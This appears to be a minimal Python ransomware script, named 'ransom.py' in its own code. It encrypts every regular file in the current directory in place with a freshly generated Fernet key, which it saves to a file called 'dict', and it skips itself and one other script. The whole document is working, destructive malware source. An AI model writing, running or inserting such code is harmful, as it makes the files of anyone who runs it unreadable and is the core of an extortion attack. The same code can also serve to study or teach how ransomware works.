#!/usr/bin/env python3
import os
from cryptography.fernet import Fernet
#umm boop bop bah duu

files = []

for file in os.listdir():
     if file == "ransom.py" or file == "dict" or file == "ugly.py":
        continue
     if os.path.isfile(file):
        files.append(file)

key = Fernet.generate_key()

with open("dict","wb") as thekey:
    thekey.write(key)

for file in files: 
    with open(file, "rb") as bFiles:
        contents = bFiles.read()
    contents_beautiful = Fernet(key).encrypt(contents)
    with open(file, "wb") as bFile:
        bFile.write(contents_beautiful)
